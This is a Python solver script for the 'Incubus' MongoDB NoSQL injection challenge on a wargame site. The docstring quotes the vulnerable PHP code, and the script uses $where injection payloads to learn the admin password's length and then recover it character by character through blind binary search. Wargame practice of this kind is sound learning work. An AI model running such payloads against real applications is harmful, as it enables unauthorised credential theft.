#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'Hello admin' in args[0]


def main():
    """
    Incubus 48 MongoDB NoSQL injection

    $db = mongodb_connect();
    if(preg_match('/prob|_|\(/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\(/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = array("\$where" => "function(){return obj.id=='{$_GET['id']}'&&obj.pw=='{$_GET['pw']}';}");
    echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
    $result = mongodb_fetch_array($db->prob_incubus->find($query));
    if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

    $query = array("id" => "admin");
    $result = mongodb_fetch_array($db->prob_incubus->find($query));
    if($result['pw'] === $_GET['pw']) solve("incubus");
    """

    url = "https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': 'admin'}

    payload = "'||obj.pw.length>'%s"
    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"'||obj.id=='admin'&&obj.pw[%d]<'%s"
    result = p.find_binary(check_func, len_of_key, left=48, letter=True, start_i=0)

    p.payload = result
    response = p.my_request()
    if 'Clear!' in response:
        print('\nIncubus Clear!')


if __name__ == '__main__':
    main()
